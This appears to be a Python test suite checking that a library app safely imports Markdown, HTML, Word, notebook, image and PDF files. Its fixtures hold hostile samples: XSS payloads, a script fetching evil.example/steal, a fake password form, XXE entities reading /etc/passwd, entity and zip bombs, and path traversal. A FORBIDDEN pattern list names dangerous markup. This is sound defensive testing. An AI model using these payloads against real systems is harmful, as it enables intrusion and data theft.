"""Markdown, text, HTML, Word, notebook and image imports, PDFs without a text layer, and OCR.

Every file here is synthetic and built by the test. Each format is checked with a normal file,
with hostile content, for app class names in the reader HTML, and for search.
"""
import base64
import json
from pathlib import Path
import re
import struct
import sys
import tempfile
import time
import unittest
from unittest.mock import patch
import zipfile

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT/'backend'))
import book_formats
import book_markdown
import book_ocr
import library
from library import Library, import_book
from book_fixture import docx_body, make_docx, make_ipynb, make_no_text_pdf, para, png, write
from test_library import Attributes, app_class_names

IMAGE_REL = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/image'
LINK_REL = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink'
# Markup a hostile file may use to run code, load something remote, or look like the app.
FORBIDDEN = ('<script', '<iframe', '<object', '<embed', '<form', '<input', '<style', '<link', '<meta', '<base', '<svg',
             'onerror', 'onclick', 'onload', 'javascript:', 'style=', 'srcset', 'data:', 'tracker.example', 'evil.example/x.png')


def drawing(rel_id, description='Chart'):
    return (f'<w:r><w:drawing><wp:inline><wp:docPr id="1" name="Picture" descr="{description}"/><a:graphic><a:graphicData>'
            f'<a:blip r:embed="{rel_id}"/></a:graphicData></a:graphic></wp:inline></w:drawing></w:r>')


def jpeg(width, height):
    return (b'\xff\xd8\xff\xe0' + struct.pack('>H', 16) + b'JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
            + b'\xff\xc0' + struct.pack('>HBHHB', 17, 8, height, width, 3) + b'\x01\x22\x00\x02\x11\x01\x03\x11\x01\xff\xd9')


class FormatTestCase(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.data = self.root/'data'
        self.library = Library(self.data)

    def tearDown(self):
        self.tmp.cleanup()

    def load(self, name, content, book_id='doc'):
        return import_book(write(self.root/name, content) if not isinstance(content, Path) else content, self.data, book_id)

    def html(self, book_id='doc'):
        book = self.library.book(book_id)
        return ''.join(self.library.chapter(book_id, n).get('html', '') for n in range(1, book['count'] + 1))

    def assertSafe(self, html):
        lowered = html.lower()
        for forbidden in FORBIDDEN:
            self.assertNotIn(forbidden, lowered)
        found = Attributes(html)
        for name in found.classes | found.ids:
            self.assertTrue(name.startswith('bk-'), name)
        self.assertFalse(found.classes & app_class_names())
        # Every image comes from this book's own files.
        for src in re.findall(r'<img[^>]* src="([^"]*)"', html):
            self.assertTrue(src.startswith('/api/library/'), src)

    def assertNothingPublished(self):
        self.assertEqual([path.name for path in (self.data/'library').iterdir()], [])


class MarkdownTests(FormatTestCase):
    def test_headings_become_sections_with_lists_code_tables_and_links(self):
        source = '''---
title: Front matter title
---
# Kernels

A *kernel* runs on **many** threads. See [memory](#shared-memory) and [the guide](https://example.org/guide).

- one
- two
  1. nested
- three

```cuda
__global__ void add() {}
```

| Term | Meaning |
|------|:-------:|
| warp | 32 threads |

# Memory

## Shared memory

Text with `inline code` and a break\\
here. ![Diagram](figures/diagram.png)

[ref link][guide]

[guide]: https://example.org/ref
'''
        book = self.load('notes.md', source)
        self.assertEqual((book['format'], book['title'], book['count'], book['textPages']), ('markdown', 'Front matter title', 2, 2))
        self.assertEqual([entry['title'] for entry in book['toc']], ['Kernels', 'Memory'])
        self.assertEqual(book['sourceExtension'], 'md')
        first, second = self.library.chapter('doc', 1)['html'], self.library.chapter('doc', 2)['html']
        self.assertIn('<em>kernel</em>', first)
        self.assertIn('<strong>many</strong>', first)
        self.assertIn('<ul><li>one</li><li>two<ol><li>nested</li></ol></li><li>three</li></ul>', first)
        self.assertIn('<p class="bk-code-label">cuda</p>', first)
        self.assertIn('__global__ void add() {}', first)
        self.assertIn('<th>Term</th>', first)
        # A fragment link goes to the section that holds the heading.
        self.assertIn('href="#books/doc/2/shared-memory"', first)
        self.assertIn('id="bk-shared-memory"', second)
        self.assertIn('href="https://example.org/guide" target="_blank" rel="noreferrer noopener"', first)
        self.assertIn('href="https://example.org/ref"', second)
        self.assertIn('<code>inline code</code>', second)
        self.assertIn('<br>', second)
        self.assertIn('Image was not included in the imported file.', second)
        self.assertSafe(first + second)
        self.assertEqual([hit['location'] for hit in self.library.search('memory', 'doc')], [1, 2])
        self.assertEqual([hit['location'] for hit in self.library.search('shared memory', 'doc')], [2])

    def test_hostile_markdown_is_inert(self):
        source = '''# Title <script>alert(1)</script>

<script>
fetch('https://evil.example/steal')
</script>
<style>body{display:none}</style>
<div class="solution-overlay" onclick="steal()">Fake overlay</div>
<img src="https://tracker.example/pixel.png" onerror="alert(1)">
<iframe src="https://evil.example"></iframe>

[click](javascript:alert(1)) [CLICK](JAVASCRIPT:alert(1)) [data](data:text/html,<b>x</b>) [proto](//evil.example/x)
![remote](https://tracker.example/pixel.png) ![escape](../../../etc/passwd) ![inline](data:image/png;base64,AAAA)
<a href="https://evil.example/login">raw link</a> <form action="https://evil.example"><input name="password"></form>
'''
        self.load('evil.md', source)
        html = self.html()
        self.assertSafe(html)
        self.assertIn('Fake overlay', html)  # The text stays; its markup does not.
        self.assertNotIn('evil.example', html)
        self.assertNotIn('fetch(', html)
        self.assertIn('Remote image omitted from this offline copy.', html)
        for label in ('click', 'CLICK', 'data', 'proto'):
            self.assertIn(f'<a>{label}</a>', html)

    def test_pathological_markdown_finishes_quickly_without_deep_recursion(self):
        cases = {
            'brackets': '[' * 200_000 + ']' * 200_000,
            'links': '[a](' * 50_000,
            'emphasis': '*_' * 200_000,
            'backticks': '`a ' * 100_000 + '``' * 50_000,
            'tags': '<a ' * 100_000,
            'quotes': '>' * 50_000 + ' deep',
            'lists': ''.join('  ' * depth + '- item\n' for depth in range(2000)),
            'rules': '- ' * 100_000 + 'x\n\n' + '* ' * 100_000 + '\n\n' + '_ ' * 100_000 + 'x',
            'tables': 'a | b\n|' + '-|' * 50_000 + ' ' * 100_000 + 'x\n\n| a |\n|---|\n' + '| x |\n' * 20_000,
            'references': ('[a]: https://example.org/' + 'x' * 1000 + ' ' * 100_000 + 'y\n[b]: https://example.org/b\n\n'
                           + '[a][b]' * 10_000 + '[b]' * 10_000 + '[' * 5000 + '][b]' * 5000),
        }
        for name, source in cases.items():
            with self.subTest(case=name):
                started = time.monotonic()
                book = self.load(f'{name}.md', source, f'case-{name.replace("_", "-")}')
                self.assertGreaterEqual(book['count'], 1)
                self.assertLess(time.monotonic() - started, 20)
        self.assertSafe(''.join(self.html(f'case-{name}') for name in cases))

    def test_element_limit_and_empty_file(self):
        with patch.object(book_markdown, 'MAX_NODES', 50):
            with self.assertRaisesRegex(ValueError, 'more than 50 elements'):
                self.load('many.md', '\n\n'.join(f'para {n}' for n in range(100)))
        with self.assertRaisesRegex(ValueError, 'no readable pages'):
            self.load('empty.md', '\n\n   \n')
        self.assertNothingPublished()


class TextTests(FormatTestCase):
    def test_paragraphs_keep_line_breaks_and_markup_is_text(self):
        book = self.load('notes.txt', 'Title line\nsecond line\n\n<script>alert(1)</script> & <b>not bold</b>\n\n\n  indented\n')
        self.assertEqual((book['format'], book['title'], book['count']), ('text', 'notes', 1))
        html = self.library.chapter('doc', 1)['html']
        self.assertEqual(html, '<p>Title line\nsecond line</p><p>&lt;script&gt;alert(1)&lt;/script&gt; &amp; &lt;b&gt;not bold&lt;/b&gt;</p><p>  indented</p>')
        self.assertEqual(self.library.search('second line', 'doc')[0]['location'], 1)

    def test_long_files_split_into_sections_by_size(self):
        paragraphs = [f'Paragraph {n} ' + 'word ' * 30 for n in range(200)]
        with patch.object(book_formats, 'TEXT_SECTION', 2000):
            book = self.load('long.txt', '\n\n'.join(paragraphs) + '\n\n' + 'x' * 5000)
        self.assertGreater(book['count'], 10)
        title = book['toc'][0]['title']
        self.assertTrue(title.startswith('Paragraph 0 word word') and title.endswith('word…') and len(title) <= 81, title)
        texts = [self.library.chapter('doc', n)['text'] for n in range(1, book['count'] + 1)]
        self.assertTrue(all(len(text) <= 2100 for text in texts))
        self.assertEqual(sum(text.count('Paragraph') for text in texts), 200)
        self.assertEqual(self.library.search('Paragraph 150 ', 'doc')[0]['location'], next(n for n, text in enumerate(texts, 1) if 'Paragraph 150 ' in text))

    def test_encodings_binary_files_and_size_limit(self):
        self.assertEqual(self.load('latin.txt', 'Caf\xe9 cr\xe8me'.encode('cp1252'))['textPages'], 1)
        self.assertIn('Café crème', self.library.chapter('doc', 1)['text'])
        self.assertIn('Grüße', self.load('utf16.txt', '﻿Grüße'.encode('utf-16'), 'utf16')['toc'][0]['title'])
        with self.assertRaisesRegex(ValueError, 'binary file'):
            self.load('binary.txt', b'\x00\x01\x02text', 'binary')
        source = write(self.root/'big.txt', 'x')
        with patch.dict(library.INPUT_LIMITS, {'text': 0}):
            with self.assertRaisesRegex(ValueError, 'Choose a text file no larger than'):
                import_book(source, self.data, 'big')


class HtmlTests(FormatTestCase):
    def test_single_page_with_inline_image_and_sections(self):
        picture = base64.b64encode(png(4, 3)).decode()
        page = f'''<!doctype html><html><head><title>Saved article</title><meta charset="utf-8"></head><body>
<main><article><h1 id="intro">Intro</h1><p>Read <a href="#later">later</a> or <a href="https://example.org">online</a>.</p>
<figure><img src="data:image/png;base64,{picture}" alt="Small chart"><figcaption>A chart</figcaption></figure>
<h1>Next part</h1><p id="later">Later text</p><ul><li>a<li>b</ul></article></main></body></html>'''
        book = self.load('article.html', page)
        self.assertEqual((book['format'], book['title'], book['count']), ('html', 'Saved article', 2))
        self.assertEqual(len(book['assets']), 1)
        self.assertEqual(book['assets'][0]['mediaType'], 'image/png')
        html = self.html()
        self.assertIn('href="#books/doc/2/later"', html)
        self.assertIn(f'src="/api/library/doc/asset/{book["assets"][0]["path"]}"', html)
        self.assertIn('alt="Small chart"', html)
        self.assertIn('<li>a</li><li>b</li>', html)
        self.assertSafe(html)
        self.assertEqual(self.library.search('later text')[0]['location'], 2)

    def test_hostile_html_loads_and_runs_nothing(self):
        svg = base64.b64encode(b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>').decode()
        fake = base64.b64encode(b'<html><script>alert(1)</script></html>').decode()
        page = f'''<html><head><base href="https://evil.example/"><meta http-equiv="refresh" content="0;url=https://evil.example">
<link rel="stylesheet" href="https://evil.example/x.css"><style>@import url(https://evil.example/x.css)</style>
<script src="https://evil.example/x.js"></script></head>
<body onload="alert(1)"><p>Before</p><div class="solution-overlay error-toast" id="root" style="position:fixed;inset:0">
<h1 onclick="alert(1)">Title</h1><p>Safe <a href="javascript:alert(1)">js</a> <a href="JaVaScRiPt:alert(1)">js2</a>
<a href="data:text/html,<script>alert(1)</script>">data</a> <a href="vbscript:x">vb</a></p>
<img src="https://tracker.example/p.png" srcset="https://tracker.example/2x.png 2x"><img src="x" onerror="alert(1)">
<img src="data:image/svg+xml;base64,{svg}"><img src="data:image/png;base64,{fake}">
<iframe srcdoc="<script>alert(1)</script>"></iframe><object data="https://evil.example/x"></object><embed src="https://evil.example/x">
<form action="https://evil.example"><input name="password"><button>Send</button><p>Form text</p></form>
<svg><script>alert(1)</script><foreignObject><p>hidden</p></foreignObject></svg><template><p>template text</p></template>
<noscript><p>noscript</p></noscript><video src="https://evil.example/v.mp4"><p>fallback</p></video>
<math><mi>x</mi></math></div></body></html>'''
        book = self.load('evil.html', page)
        html = self.html()
        self.assertSafe(html)
        self.assertEqual(book['assets'], [])
        self.assertNotIn('evil.example', html)
        self.assertIn('Form text', html)
        for hidden in ('hidden', 'template text', 'noscript', 'fallback', 'Send', 'alert'):
            self.assertNotIn(hidden, html)
        found = Attributes(html)
        self.assertEqual(found.ids, {'bk-root'})
        self.assertTrue({'bk-solution-overlay', 'bk-error-toast'} <= found.classes)

    def test_headings_inside_an_article_next_to_navigation_split_the_page(self):
        page = ('<nav><a href="/">Home</a></nav><article id="story"><h1>First</h1><p>one</p><h1>Second</h1><p>two</p></article>'
                '<footer><p>Footer text</p></footer>')
        book = self.load('article.html', page)
        self.assertEqual([entry['title'] for entry in book['toc']], ['First', 'Second'])
        self.assertIn('<a id="bk-story"></a>', self.library.chapter('doc', 1)['html'])
        self.assertIn('Home', self.library.chapter('doc', 1)['text'])
        self.assertIn('Footer text', self.library.chapter('doc', 2)['text'])

    def test_inline_image_limits_and_deep_nesting(self):
        picture = base64.b64encode(png(4, 4)).decode()
        with patch.object(book_formats, 'MAX_INLINE_IMAGE', 10):
            book = self.load('big-image.html', f'<p>Text</p><img src="data:image/png;base64,{picture}">')
        self.assertEqual(book['assets'], [])
        self.assertIn('Image was not included', self.html())
        with patch.object(book_formats, 'MAX_IMAGE_PIXELS', 10):
            self.assertEqual(self.load('wide.html', f'<p>Text</p><img src="data:image/png;base64,{picture}">', 'wide')['assets'], [])
        deep = '<div>' * 5000 + '<p>Deep text</p>' + '</div>' * 5000
        self.load('deep.html', deep, 'deep')
        self.assertIn('Deep text', self.library.chapter('deep', 1)['text'])
        with patch.object(library, 'MAX_IMAGES', 2):
            images = ''.join(f'<img src="data:image/png;base64,{base64.b64encode(png(n + 1, 1)).decode()}">' for n in range(3))
            with self.assertRaisesRegex(ValueError, 'more than 2 images'):
                self.load('many.html', '<p>x</p>' + images, 'many')


class DocxTests(FormatTestCase):
    def body(self):
        return (para('Overview', 'Heading1')
                + para('', runs='<w:r><w:rPr><w:b/></w:rPr><w:t>Bold</w:t></w:r><w:r><w:t xml:space="preserve"> and </w:t></w:r>'
                       '<w:r><w:rPr><w:i/></w:rPr><w:t>italic</w:t></w:r><w:r><w:rPr><w:b w:val="0"/></w:rPr><w:t xml:space="preserve"> plain</w:t></w:r>')
                + para('', runs='<w:hyperlink r:id="rLink"><w:r><w:t>Example site</w:t></w:r></w:hyperlink>'
                       '<w:r><w:t xml:space="preserve"> and </w:t></w:r><w:hyperlink w:anchor="details"><w:r><w:t>details</w:t></w:r></w:hyperlink>')
                + para('first bullet', numbering=(0, 1)) + para('nested bullet', numbering=(1, 1)) + para('step one', numbering=(0, 2))
                + para('', runs=drawing('rImg', 'Throughput chart'))
                + '<w:tbl><w:tr><w:trPr><w:tblHeader/></w:trPr><w:tc>' + para('Name') + '</w:tc><w:tc>' + para('Value') + '</w:tc></w:tr>'
                + '<w:tr><w:tc><w:tcPr><w:gridSpan w:val="2"/></w:tcPr>' + para('Merged cell') + '</w:tc></w:tr></w:tbl>'
                + para('Details', 'Heading1') + para('', runs='<w:bookmarkStart w:id="0" w:name="details"/><w:r><w:t>Anchor text</w:t></w:r>')
                + para('x = 1', 'Code') + para('y = 2', 'Code')
                + '<w:p><w:r><w:delText>deleted words</w:delText></w:r></w:p>')

    def test_headings_lists_tables_links_and_pictures(self):
        rels = (f'<Relationship Id="rLink" Type="{LINK_REL}" Target="https://example.org/docs" TargetMode="External"/>'
                f'<Relationship Id="rImg" Type="{IMAGE_REL}" Target="media/image1.png"/>')
        book = self.load('report.docx', make_docx(self.root/'report.docx', self.body(), rels, {'word/media/image1.png': png(5, 5)}))
        self.assertEqual((book['format'], book['title'], book['author'], book['count']), ('docx', 'Fixture Report', 'Test Author', 2))
        self.assertEqual([entry['title'] for entry in book['toc']], ['Overview', 'Details'])
        first, second = self.library.chapter('doc', 1)['html'], self.library.chapter('doc', 2)['html']
        self.assertIn('<strong>Bold</strong> and <em>italic</em> plain', first)
        self.assertIn('<a href="https://example.org/docs" target="_blank" rel="noreferrer noopener">Example site</a>', first)
        self.assertIn('href="#books/doc/2/details"', first)
        self.assertIn('id="bk-details"', second)
        self.assertIn('<ul><li>first bullet<ul><li>nested bullet</li></ul></li></ul><ol><li>step one</li></ol>', first)
        self.assertIn('<th><p>Name</p></th>', first)
        self.assertIn('colspan="2"', first)
        self.assertIn(f'src="/api/library/doc/asset/{book["assets"][0]["path"]}" alt="Throughput chart"', first)
        self.assertIn('<pre><code>x = 1\ny = 2</code></pre>', second)
        self.assertNotIn('deleted words', first + second)
        self.assertSafe(first + second)
        self.assertEqual(self.library.search('anchor text', 'doc')[0]['location'], 2)

    def test_entity_bombs_and_external_entities_are_refused(self):
        def declared(doctype, text):
            return '<?xml version="1.0"?>' + doctype + docx_body(para(text)).split('?>', 1)[1]
        bomb = declared('<!DOCTYPE w:document [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;">]>', '&c;')
        with self.assertRaisesRegex(ValueError, 'Word file declares XML entities'):
            self.load('bomb.docx', make_docx(self.root/'bomb.docx', '', document=bomb))
        external = declared('<!DOCTYPE w:document [<!ENTITY x SYSTEM "file:///etc/passwd">]>', '&x;')
        with self.assertRaisesRegex(ValueError, 'XML entities'):
            self.load('external.docx', make_docx(self.root/'external.docx', '', document=external))
        parameter = declared('<!DOCTYPE w:document [<!ENTITY % p SYSTEM "https://evil.example/x.dtd"> %p;]>', 'x')
        with self.assertRaisesRegex(ValueError, 'XML entities'):
            self.load('parameter.docx', make_docx(self.root/'parameter.docx', '', document=parameter))
        self.assertNothingPublished()

    def test_zip_bombs_and_archive_limits(self):
        huge = docx_body(para('a' * (17 << 20)))
        source = make_docx(self.root/'huge.docx', '', document=huge)
        self.assertLess(source.stat().st_size, 1 << 20)
        with self.assertRaisesRegex(ValueError, 'larger than 16 MB when unpacked'):
            self.load('huge.docx', source)
        source = make_docx(self.root/'many.docx', para('x'), files={f'word/media/{n}.bin': b'' for n in range(20)})
        with patch.object(library, 'MAX_ARCHIVE_ENTRIES', 10):
            with self.assertRaisesRegex(ValueError, 'expands beyond'):
                self.load('many.docx', source)
        with patch.object(library, 'MAX_EXPANDED_BYTES', 100):
            with self.assertRaisesRegex(ValueError, 'expands beyond'):
                self.load('many.docx', source)
        # The unpacked size is counted while reading, so a smaller limit applies below the header check too.
        with patch.object(book_formats, 'MAX_DOCX_XML', 200):
            with self.assertRaisesRegex(ValueError, 'over the import limit'):
                self.load('small.docx', make_docx(self.root/'small.docx', para('b' * 500)))
        self.assertNothingPublished()

    def test_path_traversal_and_remote_targets_in_relationships(self):
        rels = (f'<Relationship Id="rUp" Type="{IMAGE_REL}" Target="../../../../etc/passwd"/>'
                f'<Relationship Id="rAbs" Type="{IMAGE_REL}" Target="/etc/hosts"/>'
                f'<Relationship Id="rFile" Type="{IMAGE_REL}" Target="file:///etc/passwd"/>'
                f'<Relationship Id="rRemote" Type="{IMAGE_REL}" Target="https://tracker.example/p.png" TargetMode="External"/>'
                f'<Relationship Id="rText" Type="{IMAGE_REL}" Target="media/notes.png"/>'
                f'<Relationship Id="rLink" Type="{LINK_REL}" Target="javascript:alert(1)" TargetMode="External"/>')
        body = (para('Pictures', 'Heading1') + ''.join(para('', runs=drawing(rel)) for rel in ('rUp', 'rAbs', 'rFile', 'rRemote', 'rText', 'rMissing'))
                + para('', runs='<w:hyperlink r:id="rLink"><w:r><w:t>bad link</w:t></w:r></w:hyperlink>'))
        source = make_docx(self.root/'paths.docx', body, rels, {'word/media/notes.png': b'<script>alert(1)</script>'})
        book = self.load('paths.docx', source)
        html = self.html()
        self.assertEqual(book['assets'], [])
        self.assertEqual(html.count('Image was not included in the imported file.'), 5)
        self.assertEqual(html.count('Remote image omitted from this offline copy.'), 1)
        self.assertIn('<a>bad link</a>', html)
        self.assertSafe(html)
        self.assertEqual(sorted(p.name for p in (self.data/'library/doc').iterdir()), ['book.json', 'chapters', 'source.docx'])
        with zipfile.ZipFile(source, 'a') as archive:
            archive.writestr('../../escape.txt', 'unsafe')
        with self.assertRaisesRegex(ValueError, 'unsafe file path'):
            self.load('escape.docx', source, 'escape')

    def test_not_a_word_file(self):
        for name, content in (('old.docx', b'\xd0\xcf\x11\xe0 not a zip'), ('empty.docx', b'PK\x05\x06' + b'\x00' * 18)):
            with self.subTest(name=name), self.assertRaisesRegex(ValueError, 'Word'):
                self.load(name, content)
        self.assertNothingPublished()


class NotebookTests(FormatTestCase):
    def cells(self):
        figure = base64.b64encode(png(6, 4)).decode()
        table = ('<style>.x{color:red}</style><div class="solution-overlay"><table class="dataframe"><thead><tr><th>a</th></tr></thead>'
                 '<tbody><tr><td onclick="x()">1</td></tr></tbody></table><script>alert(1)</script></div>')
        return [
            {'cell_type': 'markdown', 'metadata': {}, 'source': ['# Training run\n', 'Loss goes *down*. ![plot](attachment:plot.png)'],
             'attachments': {'plot.png': {'image/png': figure}}},
            {'cell_type': 'code', 'execution_count': 3, 'metadata': {}, 'source': ['import os\n', "open('pwned', 'w').write('ran')"],
             'outputs': [{'output_type': 'stream', 'name': 'stdout', 'text': ['epoch 1 loss 0.5\n']},
                         {'output_type': 'stream', 'name': 'stderr', 'text': 'warning\n'},
                         {'output_type': 'display_data', 'data': {'image/png': figure, 'text/plain': ['<Figure>']}, 'metadata': {}},
                         {'output_type': 'execute_result', 'execution_count': 3, 'data': {'text/html': table, 'text/plain': 'a 1'}, 'metadata': {}},
                         {'output_type': 'display_data', 'data': {'application/javascript': 'alert(1)', 'text/html': '<script>alert(1)</script>'}},
                         {'output_type': 'display_data', 'data': {'application/vnd.jupyter.widget-view+json': {'model_id': 'x'}, 'text/plain': 'Widget text'}},
                         {'output_type': 'error', 'ename': 'ValueError', 'evalue': 'bad', 'traceback': ['\x1b[0;31mValueError\x1b[0m: bad']}]},
            {'cell_type': 'markdown', 'metadata': {}, 'source': '# Results\n\n[unsafe](javascript:alert(1)) <img src=x onerror=alert(1)>'},
            {'cell_type': 'code', 'execution_count': None, 'metadata': {}, 'source': 'summary()', 'outputs': []},
            {'cell_type': 'raw', 'metadata': {}, 'source': 'raw text'},
            'not a cell', {'cell_type': 'code', 'source': 42, 'outputs': 'nope'},
        ]

    def test_cells_outputs_and_labels(self):
        book = self.load('train.ipynb', make_ipynb(self.root/'train.ipynb', self.cells()))
        self.assertEqual((book['format'], book['title'], book['count']), ('ipynb', 'Training run', 2))
        self.assertEqual(len(book['assets']), 1)  # The attachment and the output are the same picture, stored once.
        first, second = self.library.chapter('doc', 1)['html'], self.library.chapter('doc', 2)['html']
        self.assertIn('<p class="bk-code-label">In [3] · Python</p>', first)
        self.assertIn('<pre class="bk-cell-output">epoch 1 loss 0.5\n</pre>', first)
        self.assertIn('<pre class="bk-cell-error">warning\n</pre>', first)
        self.assertIn('<pre class="bk-cell-error">ValueError: bad</pre>', first)
        self.assertEqual(first.count(f'/api/library/doc/asset/{book["assets"][0]["path"]}'), 2)
        self.assertIn('<table class="bk-dataframe">', first)
        self.assertIn('<td>1</td>', first)
        self.assertIn('This output is interactive and is not shown here.', first)
        self.assertIn('Widget text', first)
        self.assertIn('In [ ] · Python', second)
        self.assertIn('raw text', second)
        self.assertSafe(first + second)
        self.assertFalse((self.root/'pwned').exists() or (ROOT/'pwned').exists())
        self.assertEqual(self.library.search('epoch 1 loss', 'doc')[0]['location'], 1)

    def test_huge_and_malformed_notebooks(self):
        with patch.object(book_formats, 'MAX_CELLS', 10):
            with self.assertRaisesRegex(ValueError, 'more than 10 cells'):
                self.load('many.ipynb', make_ipynb(self.root/'many.ipynb', [{'cell_type': 'markdown', 'source': 'x'}] * 11))
        with self.assertRaisesRegex(ValueError, 'nested too deeply'):
            self.load('deep.ipynb', '{"cells": ' + '[' * 100_000 + ']' * 100_000 + '}')
        for name, content, message in (('bad.ipynb', '{not json', 'not valid JSON'), ('list.ipynb', '[]', 'not a Jupyter notebook'),
                                       ('v3.ipynb', '{"worksheets": []}', 'format 4'), ('bytes.ipynb', b'\xff\xfe\x00', 'not valid JSON')):
            with self.subTest(name=name), self.assertRaisesRegex(ValueError, message):
                self.load(name, content)
        self.assertNothingPublished()
        outputs = [{'output_type': 'stream', 'name': 'stdout', 'text': 'line\n' * 20_000}] * 60
        book = self.load('long.ipynb', make_ipynb(self.root/'long.ipynb', [{'cell_type': 'code', 'execution_count': 1, 'source': 'x', 'outputs': outputs}]))
        html = self.html()
        self.assertEqual(html.count('<pre class="bk-cell-output">'), book_formats.MAX_OUTPUTS)
        self.assertIn('more characters not shown.', html)
        self.assertIn('10 more outputs are not shown.', html)
        self.assertLess(len(html), 4 << 20)


class ImageTests(FormatTestCase):
    def test_image_is_a_one_page_book(self):
        raw = png(40, 30)
        book = self.load('Diagram.png', raw)
        self.assertEqual((book['format'], book['title'], book['count'], book['textPages']), ('image', 'Diagram', 1, 0))
        self.assertEqual((book['cover'], book['sourceType'], book['assets']), ('source.png', 'image/png', []))
        self.assertIn('40 × 30 pixels', book['attribution'])
        self.assertEqual(self.html(), '<figure><img src="/api/library/doc/asset/source.png" alt="Diagram" loading="lazy" tabindex="0" role="button"></figure>')
        path, media_type = self.library.asset('doc', 'source.png')
        self.assertEqual((path.read_bytes(), media_type), (raw, 'image/png'))
        self.assertEqual(self.library.search('Diagram', 'doc'), [])

    def test_formats_are_read_from_their_headers(self):
        gif = b'GIF89a' + struct.pack('<HH', 5, 6) + b'\x00\x00\x00;'
        webp = b'RIFF' + struct.pack('<I', 30) + b'WEBPVP8X' + struct.pack('<I', 10) + b'\x00' * 4 + (99).to_bytes(3, 'little') + (49).to_bytes(3, 'little')
        for name, raw, kind in (('photo.jpg', jpeg(40, 30), 'image/jpeg'), ('anim.gif', gif, 'image/gif'), ('pic.webp', webp, 'image/webp'),
                                ('renamed.png', jpeg(8, 8), 'image/jpeg')):
            with self.subTest(name=name):
                book = self.load(name, raw, name.split('.')[0])
                self.assertEqual(book['sourceType'], kind)
                self.assertEqual(self.library.asset(book['id'], 'source' + Path(name).suffix)[1], kind)
        self.assertEqual(book_formats.image_size(webp, 'image/webp'), (100, 50))

    def test_hostile_images_are_refused(self):
        huge = png(1, 1)[:16] + struct.pack('>II', 100_000, 100_000) + png(1, 1)[24:]
        svg = b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
        for name, raw, message in (('page.png', b'<html><script>alert(1)</script></html>', 'not a PNG, JPEG'),
                                   ('vector.png', svg, 'not a PNG, JPEG'), ('huge.png', huge, 'larger than 64 megapixels'),
                                   ('cut.jpg', b'\xff\xd8\xff\xe0\x00', 'size of this image could not be read')):
            with self.subTest(name=name), self.assertRaisesRegex(ValueError, message):
                self.load(name, raw)
        self.assertNothingPublished()


class NoTextPdfTests(FormatTestCase):
    def test_pdf_without_a_text_layer_imports_with_page_contents(self):
        book = import_book(make_no_text_pdf(self.root/'art.pdf', pages=3), self.data, 'art')
        self.assertEqual((book['count'], book['textPages'], book['title']), (3, 0, 'art'))
        self.assertEqual([entry['title'] for entry in book['toc']], ['Page 1', 'Page 2', 'Page 3'])
        self.assertEqual(self.library.chapter('art', 2)['text'], '')
        self.assertEqual(self.library.search('anything', 'art'), [])
        outlined = import_book(make_no_text_pdf(self.root/'outlined.pdf', pages=3, outline=True), self.data, 'outlined')
        self.assertEqual([(entry['title'], entry['location']) for entry in outlined['toc']], [('Cover art', 1), ('Back page', 3)])

    def test_older_pdf_imports_gain_a_text_page_count_once(self):
        import_book(make_no_text_pdf(self.root/'art.pdf'), self.data, 'art')
        path = self.data/'library/art/book.json'
        stored = json.loads(path.read_text())
        del stored['textPages'], stored['printedLabels']
        path.write_text(json.dumps(stored))
        self.assertEqual((Library(self.data).book('art')['textPages'], Library(self.data).book('art')['printedLabels']), (0, False))
        self.assertEqual(json.loads(path.read_text())['textPages'], 0)

    def test_page_labels_are_printed_pages_only_when_the_pdf_has_them(self):
        from pypdf import PdfWriter
        plain = import_book(make_no_text_pdf(self.root/'plain.pdf', pages=2), self.data, 'plain')
        self.assertEqual((plain['printedLabels'], [entry['title'] for entry in plain['toc']]), (False, ['Page 1', 'Page 2']))
        writer = PdfWriter()
        for _ in range(4):
            writer.add_blank_page(width=100, height=100)
        writer.set_page_label(0, 1, style='/r')
        writer.set_page_label(2, 3, style='/D', start=1)
        writer.write(self.root/'labelled.pdf')
        labelled = import_book(self.root/'labelled.pdf', self.data, 'labelled')
        self.assertEqual(labelled['printedLabels'], True)
        self.assertEqual([(entry['title'], entry['label']) for entry in labelled['toc']], [('Page i', 'i'), ('Page ii', 'ii'), ('Page 1', '1'), ('Page 2', '2')])

    def test_a_known_edition_gets_its_title_and_printed_page_offset(self):
        source = make_no_text_pdf(self.root/'an_engineers_guide.pdf', pages=4)
        sha = library.digest(source)
        edition = dict(book='harness-guide', title="An engineer's guide to harnesses", author='Alex Ker and Zak Keener', pageOffset=-1, front=['Cover'])
        with patch.dict(library.KNOWN_EDITIONS, {sha: edition}):
            book = import_book(source, self.data, 'guide')
            self.assertEqual((book['title'], book['author'], book['printedLabels']), (edition['title'], edition['author'], True))
            self.assertEqual([(entry['title'], entry['label']) for entry in book['toc']], [('Cover', 'Cover'), ('Page 1', '1'), ('Page 2', '2'), ('Page 3', '3')])
            self.assertEqual(self.library.chapter('guide', 4)['label'], '3')
            # A copy imported before the offset existed is relabelled once, notes and position untouched.
            path = self.data/'library/guide/book.json'
            stored = json.loads(path.read_text())
            del stored['printedLabels']
            stored['toc'] = [{**entry, 'label': str(entry['location']), 'title': f"Page {entry['location']}"} for entry in stored['toc']]
            path.write_text(json.dumps(stored))
            for n in range(1, 5):
                chapter_path = self.data/f'library/guide/chapters/{n}.json'
                chapter_path.write_text(json.dumps({**json.loads(chapter_path.read_text()), 'label': str(n), 'title': f'Page {n}'}))
            upgraded = Library(self.data).book('guide')
            self.assertEqual([entry['label'] for entry in upgraded['toc']], ['Cover', '1', '2', '3'])
            self.assertEqual(Library(self.data).chapter('guide', 2)['label'], '1')

    def test_ocr_text_is_stored_in_page_order_and_searchable(self):
        import_book(make_no_text_pdf(self.root/'art.pdf', pages=3), self.data, 'art')
        with self.assertRaisesRegex(ValueError, 'in order'):
            self.library.set_ocr_text('art', 2, 'too early')
        summary = self.library.set_ocr_text('art', 1, 'Harness  engineering\n guide')
        self.assertEqual((summary['ocrPages'], summary['textPages']), (1, 0))
